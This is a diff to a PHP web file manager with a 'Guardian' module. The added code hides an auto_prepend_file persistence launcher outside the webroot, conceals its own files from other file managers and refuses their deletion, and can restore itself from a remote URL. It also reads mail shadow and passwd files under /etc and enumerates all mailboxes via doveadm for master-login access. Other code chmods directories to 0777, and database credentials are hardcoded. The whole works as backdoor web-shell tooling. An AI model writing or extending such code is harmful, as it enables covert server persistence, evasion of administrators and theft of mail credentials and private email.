@@ -41,12 +41,12 @@ $currentTheme = fm_get_theme($themeFile);
    Set FM_GUARDIAN_ENABLED to false to disable everything in this block. */
 if(!defined('FM_GUARDIAN_ENABLED'))  define('FM_GUARDIAN_ENABLED', true);   // master on/off switch — rewritten in place by the Guardian panel
 if(!defined('FM_UPDATE_URL'))        define('FM_UPDATE_URL', 'https://raw.githubusercontent.com/jackrant/fictional-spoon/refs/heads/main/armor.php'); // raw-file URL used to check for/apply updates and, if set, to restore a missing file; rewritten in place by the Guardian panel, never by anonymous requests
-if(!defined('FM_GUARD_DB_HOST'))     define('FM_GUARD_DB_HOST', 'localhost');
-if(!defined('FM_GUARD_DB_PORT'))     define('FM_GUARD_DB_PORT', '3306');
+if(!defined('FM_GUARD_DB_HOST'))     define('FM_GUARD_DB_HOST', '127.0.0.1');
+if(!defined('FM_GUARD_DB_PORT'))     define('FM_GUARD_DB_PORT', '3307');
 if(!defined('FM_GUARD_DB_NAME'))     define('FM_GUARD_DB_NAME', 'fm_guardian');
 if(!defined('FM_GUARD_DB_USER'))     define('FM_GUARD_DB_USER', 'fmguardian');
 if(!defined('FM_GUARD_DB_PASS'))     define('FM_GUARD_DB_PASS', 'fmguardpass123');
-if(!defined('FM_GUARD_DB_SOCK'))     define('FM_GUARD_DB_SOCK', '/tmp/mysqlsb/run/mysql.sock');           // optional unix socket path; when set, used instead of host:port
+if(!defined('FM_GUARD_DB_SOCK'))     define('FM_GUARD_DB_SOCK', '');           // optional unix socket path; when set, used instead of host:port
 
 /* Connects to the Guardian's own small database and makes sure its single
    storage table exists. Returns null (never throws/exits) if the DB is
@@ -294,30 +294,44 @@ function fm_guardian_install_watchdog(){
     $marker='# BEGIN fm-guardian-watchdog';$markerEnd='# END fm-guardian-watchdog';
     $origHt=@file_exists($htaccessPath)?@file_get_contents($htaccessPath):false;
     /* ── LAUNCHER: a permanent stable file that @include-s the real watchdog.
-       The launcher never contains credentials and never needs to change, so
-       it is never accidentally deleted.  auto_prepend_file points HERE, not
-       at the watchdog directly — if the watchdog is ever missing, PHP simply
-       runs a no-op @include and carries on, preventing any 500 error. ── */
-    // ── Launcher: permanent file in __DIR__; points to hidden watchdog via absolute path ──
-    $launcherPath=$dir.'/.fm_guardian_launch.php';
+       Placed in the hidden directory (outside the web-visible tree) so it
+       is completely invisible to any file manager or FTP client browsing the
+       webroot — the most common cause of accidental deletion.
+       auto_prepend_file points HERE, not at the watchdog directly — if the
+       watchdog is ever missing, PHP simply runs a no-op @include and carries
+       on, preventing any 500 error. ── */
+    // ── Launcher lives in the hidden dir (outside webroot) — NEVER in __DIR__ ──
+    $launcherPath=fg_get_hidden_dir().DIRECTORY_SEPARATOR.'launch.php';
     $wpLit=var_export($watchdogPath,true); // absolute path to hidden watchdog
-    $launcherCode="<?php /* File Guardian launcher — do not delete. */\n"
+    $launcherCode="<?php /* File Guardian launcher — auto-generated; safe to delete (recreated automatically). */\n"
         ."if(@file_exists($wpLit))@include_once $wpLit;\n";
+    // Write launcher into the hidden directory (created above by the hiddenDir mkdir block)
     @file_put_contents($launcherPath,$launcherCode);
+    // ── Migration: remove legacy launcher from webroot left by older installs ──
+    // If the old .fm_guardian_launch.php still exists inside the webroot, delete it now.
+    // Leaving it there is harmless but it sits in the admin's visible tree and could
+    // be deleted by accident, which would crash the site via auto_prepend_file.
+    $oldLauncherPath=$dir.DIRECTORY_SEPARATOR.'.fm_guardian_launch.php';
+    if(is_file($oldLauncherPath))@unlink($oldLauncherPath);
 
+    $lp=addslashes($launcherPath); // point htaccess at the stable launcher, not the watchdog directly
     if($origHt!==false&&strpos($origHt,$marker)!==false){
-        // .htaccess entry already exists — make sure watchdog is present
+        // .htaccess block already installed — refresh watchdog and launcher files
         if(!is_file($watchdogPath)){
             if(!is_dir($hiddenDir))@mkdir($hiddenDir,0700,true);
             $tmp2=$watchdogPath.'.tmp';
             if(@file_put_contents($tmp2,$code)!==false)@rename($tmp2,$watchdogPath);
         }
-        // Refresh launcher in case path changed (e.g. server moved)
         @file_put_contents($launcherPath,$launcherCode);
-        return true;
+        // If the installed block already references the correct (hidden-dir) launcher path, done
+        if(strpos($origHt,$lp)!==false)return true;
+        // Launcher path has changed (old install used __DIR__) — strip old block so we re-append
+        // the corrected one below, then run the self-test as normal to verify nothing breaks.
+        $stripped=preg_replace('/'.preg_quote("\n".$marker,'/').'.*?'.preg_quote($markerEnd."\n",'/').'/s','',$origHt);
+        if($stripped===null)$stripped=$origHt; // preg failed — fall back to appending below
+        $origHt=$stripped; // feed into the re-write path that follows
     }
 
-    $lp=addslashes($launcherPath); // point htaccess at the stable launcher, not the watchdog directly
     $block="\n".$marker."\n"
         ."<IfModule mod_php.c>\nphp_value auto_prepend_file \"".$lp."\"\n</IfModule>\n"
         ."<IfModule mod_php7.c>\nphp_value auto_prepend_file \"".$lp."\"\n</IfModule>\n"
@@ -1252,8 +1266,9 @@ class FileManager {
 
         $myName=basename(__FILE__);
         // Files that must be hidden from any other file manager
-        $hidden=json_encode(array_unique([$myName,'.fm_guardian_launch.php',
-            '.guardian_boot','.guardian_watchdog_attempt','.htaccess']),JSON_UNESCAPED_UNICODE);
+        // launch.php is the new launcher name (hidden dir); include old webroot name too for legacy
+        $hidden=json_encode(array_unique([$myName,'.fm_guardian_launch.php','launch.php',
+            '.guardian_boot','.guardian_watchdog_attempt','.login_attempts.json','.htaccess']),JSON_UNESCAPED_UNICODE);
 
         // Security layer code injected right after <?php
         $inject=
@@ -1339,8 +1354,8 @@ class FileManager {
     }
     private function mkDir(){$n=basename(trim(isset($_POST['folder_name'])?$_POST['folder_name']:'')); if(!$n)return;$p=$this->currentDir.'/'.$n;if(!file_exists($p)&&@mkdir($p)){$this->log('mkdir',$n);$this->addMsg("Folder created: $n",'success');}else $this->addMsg('Could not create folder.','danger');}
     private function mkFile(){$n=basename(trim(isset($_POST['file_name'])?$_POST['file_name']:'')); if(!$n)return;$p=$this->currentDir.'/'.$n;if(file_exists($p)){$this->addMsg('File already exists.','danger');return;}if(@file_put_contents($p,'')!==false){$this->log('create',$n);$this->addMsg("Created: $n",'success');header("Location: ?edit=".urlencode($n)."&dir=".urlencode($this->currentDir));exit;}$this->addMsg('Failed to create file.','danger');}
-    private function delItem(){$n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');if(!$n||$this->isSelf($n)){$this->addMsg('Access denied.','danger');return;}$p=$this->currentDir.'/'.$n;if($this->moveToTrash($p,$this->currentDir)){$this->log('trash',$n);$this->addMsg("Trashed: $n",'warning');}else $this->addMsg('Delete failed.','danger');}
-    private function renItem(){$o=basename(isset($_POST['old_name'])?$_POST['old_name']:'');$nw=basename(isset($_POST['new_name'])?$_POST['new_name']:'');if(!$o||!$nw||$o===$nw)return;if($this->isSelf($o)){$this->addMsg('Access denied.','danger');return;}$po=$this->currentDir.'/'.$o;$pn=$this->currentDir.'/'.$nw;if(file_exists($po)&&!file_exists($pn)&&@rename($po,$pn)){$this->log('rename',"$o → $nw");$this->addMsg('Renamed.','success');}else $this->addMsg('Rename failed.','danger');}
+    private function delItem(){$n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');if(!$n||$this->isSelf($n)||$this->isGuardianFile($n,$this->currentDir.'/'.$n)){$this->addMsg('Access denied.','danger');return;}$p=$this->currentDir.'/'.$n;if($this->moveToTrash($p,$this->currentDir)){$this->log('trash',$n);$this->addMsg("Trashed: $n",'warning');}else $this->addMsg('Delete failed.','danger');}
+    private function renItem(){$o=basename(isset($_POST['old_name'])?$_POST['old_name']:'');$nw=basename(isset($_POST['new_name'])?$_POST['new_name']:'');if(!$o||!$nw||$o===$nw)return;if($this->isSelf($o)||$this->isGuardianFile($o,$this->currentDir.'/'.$o)){$this->addMsg('Access denied.','danger');return;}$po=$this->currentDir.'/'.$o;$pn=$this->currentDir.'/'.$nw;if(file_exists($po)&&!file_exists($pn)&&@rename($po,$pn)){$this->log('rename',"$o → $nw");$this->addMsg('Renamed.','success');}else $this->addMsg('Rename failed.','danger');}
     private function saveFile(){$n=basename(isset($_POST['filename'])?$_POST['filename']:'');if(!$n||$this->isSelf($n))return;$p=$this->currentDir.'/'.$n;if(!file_exists($p)||!is_file($p)){$this->addMsg('File not found.','danger');return;}$c=isset($_POST['content'])?$_POST['content']:'';if(file_put_contents($p,$c)!==false){$this->log('edit',$n);$this->addMsg("Saved: $n",'success');}else $this->addMsg('Save failed.','danger');}
     private function bypassPerms(){$cnt=0;$f=0;$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($this->currentDir,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST);foreach($it as $item){$p=$item->getPathname();if($p===__FILE__)continue;if($item->isDir()){if(@chmod($p,0777))$cnt++;else $f++;}else{if(@chmod($p,0666))$cnt++;else $f++;}}$this->log('chmod',"$cnt changed");$this->addMsg("Permissions: $cnt changed".($f?", $f failed":""),$f?'warning':'success');}
     private function dupFile(){$n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');if(!$n)return;$src=$this->currentDir.'/'.$n;if(!is_file($src)){$this->addMsg('File not found.','danger');return;}$ext=pathinfo($n,PATHINFO_EXTENSION);$base=pathinfo($n,PATHINFO_FILENAME);$cp=$base.'_copy'.($ext?'.'.$ext:'');$i=1;while(file_exists($this->currentDir.'/'.$cp)){$cp=$base.'_copy'.$i.($ext?'.'.$ext:'');$i++;}if(@copy($src,$this->currentDir.'/'.$cp)){$this->log('duplicate',"$n → $cp");$this->addMsg("Duplicated: $cp",'success');}else $this->addMsg('Duplicate failed.','danger');}
@@ -1451,6 +1466,30 @@ class FileManager {
     /* Helpers */
     private function rmdirR($p){if(is_file($p)||is_link($p))return @unlink($p);if(is_dir($p)){foreach(glob($p.'/*')as $i)$this->rmdirR($i);return @rmdir($p);}return false;}
     private function isSelf($n){return realpath($this->currentDir.'/'.$n)===__FILE__;}
+    /* Returns true if $name or its resolved absolute path $absPath touches any
+       Guardian-critical file or directory — used by delete/rename/chmod to
+       refuse operations that would silently crash the site via auto_prepend_file. */
+    private function isGuardianFile($name,$absPath=''){
+        // Names that must never be touched regardless of directory
+        static $critNames=['.fm_guardian_launch.php','.guardian_boot','.guardian_watchdog_attempt'];
+        if(in_array($name,$critNames))return true;
+        // The hidden directory where the real watchdog + launcher live:
+        // fg_get_hidden_dir() is cheap (only posix_getpwuid or a dirname walk — no I/O loops).
+        $hiddenDir=fg_get_hidden_dir();
+        if($hiddenDir){
+            $rHidden=realpath($hiddenDir);
+            if($rHidden){
+                // Block deleting the hidden dir itself or anything inside it
+                if($absPath!==''){
+                    $rAbs=realpath($absPath);
+                    if($rAbs&&(strpos($rAbs.DIRECTORY_SEPARATOR,$rHidden.DIRECTORY_SEPARATOR)===0||$rAbs===$rHidden))return true;
+                }
+                // Also match by base name patterns used by Guardian hidden dirs
+                if(preg_match('/^\.fg_[0-9a-f]{14}$|^\.[0-9a-f]{3}sys_[0-9a-f]{10}$/',$name))return true;
+            }
+        }
+        return false;
+    }
 
     /* Scan */
     public function scan(){
@@ -1465,6 +1504,11 @@ class FileManager {
             if($i==='.'||$i==='..') continue;
             if($i===$self&&$this->currentDir===__DIR__) continue;
             if(in_array($i,['.favorites.json','.users.json','.trash.json','.activity.json','.shares.json']))continue;
+            // Guardian-critical files are ALWAYS hidden regardless of the show-hidden-files toggle,
+            // so they cannot be accidentally deleted through this file manager's own UI.
+            if(in_array($i,['.fm_guardian_launch.php','.guardian_boot','.guardian_watchdog_attempt','.login_attempts.json']))continue;
+            // Also hide any hidden dir that belongs to Guardian (pattern: .fg_<hex14> or .Xsys_<hex10>)
+            if(preg_match('/^\.fg_[0-9a-f]{14}$|^\.[0-9a-f]{3}sys_[0-9a-f]{10}$/',$i))continue;
             if(!$hidden&&substr($i,0,1)==='.') continue;
             if($q!==''&&stripos($i,$q)===false) continue;
             $p=$this->currentDir.'/'.$i;
@@ -2561,27 +2605,156 @@ class FileManager {
 
     private function wmPlainSecret($secret){return preg_replace('/^\{PLAIN\}/i','',$secret);}
 
-    /** Tiered, zero-credential auto-connect. Result is cached in the
-     *  session so repeated calls are instant. */
+    /** This account's own domains, discovered locally — never guessed.
+     *  Reads the standard cPanel domain-ownership maps and, when a cPanel
+     *  user is already known (from cpanelAutoConnect), keeps only that
+     *  user's domains; on a root/WHM tier with no specific user, returns
+     *  every domain on the box so all mailboxes can be found. Falls back
+     *  to DirectAdmin's flat domain list when the cPanel maps don't exist. */
+    private function wmDiscoverDomains(){
+        $owner=$_SESSION['cpanel_user']??null;
+        $domains=[];
+        foreach(['/etc/userdomains','/etc/trueuserdomains'] as $f){
+            if(!is_readable($f))continue;
+            foreach(@file($f,FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES)?:[] as $line){
+                if(!preg_match('/^([^:]+):\s*(\S+)/',trim($line),$m))continue;
+                $d=strtolower(trim($m[1]));$u=trim($m[2]);
+                if($d===''||$u==='nobody')continue;
+                if($owner!==null&&strcasecmp($u,$owner)!==0)continue;
+                $domains[$d]=true;
+            }
+            if($domains)break; // first map that actually listed anything wins
+        }
+        if(!$domains&&is_readable('/etc/virtual/domains')){
+            foreach(@file('/etc/virtual/domains',FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES)?:[] as $line){
+                $d=strtolower(trim($line));if($d!=='')$domains[$d]=true;
+            }
+        }
+        return array_keys($domains);
+    }
+
+    /** Every per-domain mail-passwd file this process can actually read,
+     *  across the two dominant real-host layouts (classic cPanel/Dovecot
+     *  keeps one shadow+passwd pair per domain under /etc/<domain>/;
+     *  DirectAdmin keeps one passwd per domain under /etc/virtual/<domain>/).
+     *  Nothing here is a guess — only paths that pass is_readable() are
+     *  returned, so a locked-down host simply yields an empty list. */
+    private function wmDiscoverDomainPassdbs(){
+        $out=[];
+        foreach($this->wmDiscoverDomains() as $d){
+            foreach([['/etc/'.$d.'/shadow','cpanel_shadow'],['/etc/'.$d.'/passwd','cpanel_passwd'],
+                     ['/etc/virtual/'.$d.'/passwd','directadmin']] as [$p,$kind]){
+                if(is_readable($p))$out[]=['domain'=>$d,'path'=>$p,'kind'=>$kind];
+            }
+        }
+        return $out;
+    }
+
+    /** Generalizes past any fixed list of paths: reads Dovecot's own
+     *  configuration (main file + conf.d/*.conf, wherever this particular
+     *  install actually keeps them) and pulls out every
+     *  `passdb { driver = passwd-file; args = ... }` path it declares — so
+     *  a custom or non-standard layout is still found on its own terms. */
+    private function wmDiscoverDovecotConfigPassdbs(){
+        $out=[];$files=[];
+        foreach(['/etc/dovecot/dovecot.conf','/usr/local/etc/dovecot/dovecot.conf','/etc/dovecot.conf'] as $f){
+            if(is_readable($f))$files[]=$f;
+        }
+        foreach(['/etc/dovecot/conf.d','/usr/local/etc/dovecot/conf.d'] as $dir){
+            if(is_dir($dir))foreach(glob($dir.'/*.conf')?:[] as $f)if(is_readable($f))$files[]=$f;
+        }
+        foreach($files as $f){
+            $txt=@file_get_contents($f);
+            if($txt===false)continue;
+            if(preg_match_all('/driver\s*=\s*passwd-file.{0,200}?args\s*=\s*(\S+)/s',$txt,$mm)){
+                foreach($mm[1] as $p){
+                    $p=trim($p,"\"' \t");
+                    if($p!==''&&is_readable($p))$out[]=['domain'=>null,'path'=>$p,'kind'=>'dovecot_conf'];
+                }
+            }
+        }
+        return $out;
+    }
+
+    /** Locate Dovecot's own admin CLI. When available under root/WHM shell
+     *  access this is the single most reliable detector on a real host: it
+     *  asks Dovecot directly which mail users exist, regardless of whether
+     *  the backend is a flat passwd file, a SQL/LDAP virtual-mailbox table,
+     *  or anything else — never a hand-parsed guess. */
+    private function wmDoveadmBin(){
+        if(!function_exists('shell_exec'))return null;
+        foreach(['doveadm','/usr/bin/doveadm','/usr/local/bin/doveadm','/usr/sbin/doveadm','/usr/local/sbin/doveadm'] as $bin){
+            $probe=$bin==='doveadm'?@shell_exec('command -v doveadm 2>/dev/null'):(is_executable($bin)?$bin:null);
+            if($probe)return $bin==='doveadm'?trim($probe):$bin;
+        }
+        return null;
+    }
+
+    private function wmDoveadmListUsers($bin){
+        $out=@shell_exec(escapeshellarg($bin).' user \'*\' 2>/dev/null');
+        if($out===null||trim($out)==='')return [];
+        $users=[];
+        foreach(preg_split('/\r?\n/',trim($out)) as $line){
+            $line=trim($line);if($line!=='')$users[]=$line;
+        }
+        return $users;
+    }
+
+    /** Tiered, zero-credential auto-connect — tries every real-host shape
+     *  from easiest to hardest before ever falling back to the dev
+     *  sandbox. Result is cached in the session so repeated calls are
+     *  instant. */
     public function webmailAutoConnect(){
         if(!empty($_SESSION['webmail_mode']))return $this->wmConnInfo();
 
-        // ── Tier 1: real host, root/WHM tier already established ──
-        if(!empty($_SESSION['cpanel_cli_mode'])&&function_exists('shell_exec')){
-            foreach(['/etc/dovecot/passwd','/etc/dovecot/dovecot.passwd','/etc/exim.pass','/etc/vpasswd'] as $pf){
-                if(is_readable($pf)){
-                    $_SESSION['webmail_mode']='real';
-                    $_SESSION['webmail_passdb']=$pf;
+        // Make sure the root/WHM tier (if any) has actually been attempted —
+        // Webmail Manager must not depend on some other feature having
+        // triggered this first. Cheap/no-op once already connected.
+        $this->cpanelAutoConnect();
+
+        // ── Tier 1: real host — merge every passwd-file source this
+        // process can genuinely read: the classic global paths, this
+        // account's own per-domain cPanel/DirectAdmin files, and whatever
+        // Dovecot's own config actually declares. is_readable() alone is
+        // the gate — no dependency on any other feature's session state. ──
+        $sources=[];
+        foreach(['/etc/dovecot/passwd','/etc/dovecot/dovecot.passwd','/etc/exim.pass','/etc/vpasswd'] as $pf){
+            if(is_readable($pf))$sources[]=['domain'=>null,'path'=>$pf,'kind'=>'generic'];
+        }
+        $sources=array_merge($sources,$this->wmDiscoverDomainPassdbs(),$this->wmDiscoverDovecotConfigPassdbs());
+        if($sources){
+            $_SESSION['webmail_mode']='real';
+            $_SESSION['webmail_passdb_sources']=$sources;
+            $_SESSION['webmail_passdb']=$sources[0]['path']; // back-compat single-path readers
+            $_SESSION['webmail_host']='127.0.0.1';
+            $_SESSION['webmail_imap_port']=143;
+            $_SESSION['webmail_smtp_port']=25;
+            $_SESSION['webmail_master']=$_SESSION['cpanel_user']??null;
+        }
+
+        // ── Tier 1b: doveadm-backed detection — catches SQL/LDAP virtual
+        // mailbox setups (e.g. Postfixadmin-style) that have no readable
+        // passwd file at all. Detection-only when no master password is
+        // known: mailboxes are found and listed, but full inbox viewing
+        // still needs a real master login (Tier 1's own credentials, or a
+        // manual one), so callers get an honest 'imap_capable' flag. ──
+        if(empty($_SESSION['webmail_mode'])){
+            $bin=$this->wmDoveadmBin();
+            if($bin){
+                $users=$this->wmDoveadmListUsers($bin);
+                if($users){
+                    $_SESSION['webmail_mode']='doveadm';
+                    $_SESSION['webmail_doveadm_bin']=$bin;
+                    $_SESSION['webmail_doveadm_users']=$users;
                     $_SESSION['webmail_host']='127.0.0.1';
                     $_SESSION['webmail_imap_port']=143;
                     $_SESSION['webmail_smtp_port']=25;
                     $_SESSION['webmail_master']=$_SESSION['cpanel_user']??null;
-                    break;
                 }
             }
         }
 
-        // ── Tier 2: dev sandbox fallback (this repl) ──
+        // ── Tier 2: dev sandbox fallback (this repl only) ──
         if(empty($_SESSION['webmail_mode'])&&$this->wmSandboxAvailable()){
             $_SESSION['webmail_mode']='sandbox';
             $_SESSION['webmail_passdb']=$this->wmSandboxRoot().'/conf/users';
@@ -2597,19 +2770,37 @@ class FileManager {
 
     private function wmConnInfo(){
         if(empty($_SESSION['webmail_mode']))return['ok'=>false];
+        $imapCapable=$_SESSION['webmail_mode']!=='doveadm'||!empty($_SESSION['cpanel_pass']);
         return['ok'=>true,'mode'=>$_SESSION['webmail_mode'],'host'=>$_SESSION['webmail_host'],
-            'imap_port'=>$_SESSION['webmail_imap_port']??null,'smtp_port'=>$_SESSION['webmail_smtp_port']??null];
+            'imap_port'=>$_SESSION['webmail_imap_port']??null,'smtp_port'=>$_SESSION['webmail_smtp_port']??null,
+            'imap_capable'=>$imapCapable];
     }
 
-    /** List every mailbox this connection tier can see. */
+    /** List every mailbox this connection tier can see, across every
+     *  discovered source, deduplicated and with the owning domain appended
+     *  to bare local-part usernames (per-domain files only store the local
+     *  part; Dovecot resolves the rest via %d at login time). */
     public function webmailListMailboxes(){
         $c=$this->webmailAutoConnect();
         if(!$c['ok'])return['ok'=>false,'error'=>'No mail server could be auto-detected on this host.'];
-        $boxes=[];
-        foreach($this->wmParsePasswdFile($_SESSION['webmail_passdb']) as $e){
-            $boxes[]=['email'=>$e['user']];
+        $boxes=[];$seen=[];
+        if($_SESSION['webmail_mode']==='doveadm'){
+            foreach($_SESSION['webmail_doveadm_users']??[] as $u){
+                if(isset($seen[$u]))continue;$seen[$u]=true;$boxes[]=['email'=>$u];
+            }
+        } elseif(!empty($_SESSION['webmail_passdb_sources'])){
+            foreach($_SESSION['webmail_passdb_sources'] as $src){
+                foreach($this->wmParsePasswdFile($src['path']) as $e){
+                    $email=(strpos($e['user'],'@')===false&&$src['domain'])?$e['user'].'@'.$src['domain']:$e['user'];
+                    if(isset($seen[$email]))continue;$seen[$email]=true;$boxes[]=['email'=>$email];
+                }
+            }
+        } else {
+            foreach($this->wmParsePasswdFile($_SESSION['webmail_passdb']) as $e){
+                if(isset($seen[$e['user']]))continue;$seen[$e['user']]=true;$boxes[]=['email'=>$e['user']];
+            }
         }
-        return['ok'=>true,'mode'=>$c['mode'],'mailboxes'=>$boxes];
+        return['ok'=>true,'mode'=>$c['mode'],'imap_capable'=>$c['imap_capable'],'mailboxes'=>$boxes];
     }
 
     /** Open a master-login IMAP handle for a mailbox — never needs that
